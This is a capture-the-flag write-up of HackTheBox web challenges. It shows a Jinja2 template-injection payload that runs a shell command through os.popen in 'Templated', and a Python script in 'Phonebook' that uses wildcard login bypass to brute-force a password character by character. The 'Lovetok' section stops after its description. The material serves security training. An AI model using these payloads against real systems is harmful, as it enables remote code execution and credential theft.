---
title: HackTheBox Web Challenges
date: 2022-07-01 12:00:00 -0400
categories: [Web Security, HTB]
tags: [web security, labs, owasp, writeup, challenge, web]
---

# Templated

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/challenges/ch0.jpg)
- Dificulty: easy
- Description: Can you exploit this simple mistake?

## Solution
First we visit the site and see that uses jinja2, this template is susceptible to `SSTI attacks`.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/challenges/ch1.jpg)

We see that the directory searched is rendered in the page with 25, so its vulnerable to SSTI.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/challenges/ch2.jpg)

We use the payload that will allow us to `RCE` on the server to read the file `flag.txt`, we extract it from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---remote-code-execution).

```python 
# in curly brackets
self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read()
```


Then we get the flag rendered.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/challenges/ch3.jpg)


# Phonebook

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/challenges/ch.jpg)

- Dificulty: easy
- Description: Who is lucky enough to be included in the phonebook?

## Solution

when we enter to the web we see a login screen and a warning, there we discover the user `reese`, but we lack the password, in this case after trying brute force in the password field, the payload '\*' allowed me to bypass the login, then it is deduced that it uses `wildcards` and the flag is the password of reese, since it begins with HTB{\*.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/challenges/ch4.jpg)

We created a python script to brute force the pass with the help of the string and `request library`, I leave the script here for you to try it.

```python
import requests
import string

def obtain_flag(url, flag): 
    creds = {'username':'reese', 'password': flag}
    r=requests.post(url,data=creds)
    if 'success' in r.text:
        return True
    else: 
        return False
    
if __name__=="__main__":
    letters = list(string.ascii_letters)
    begin='HTB{'
    payload= letters + list(string.digits) + [',','_','-','}']
    flag=''
    url= "http://206.189.26.97:30301/login"
    while True:
        for i in payload:
            flag=begin+i+'*'
            if obtain_flag(url,flag):
                begin=begin+i
                print(begin)
            else:
                print(begin)

```

After executing the script we wait for it to decrypt the `password` and we get the flag.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/challenges/ch5.jpg)

# Lovetok

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/challenges/ch7.jpg)

- Dificulty: easy
- Description: True love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rung... 

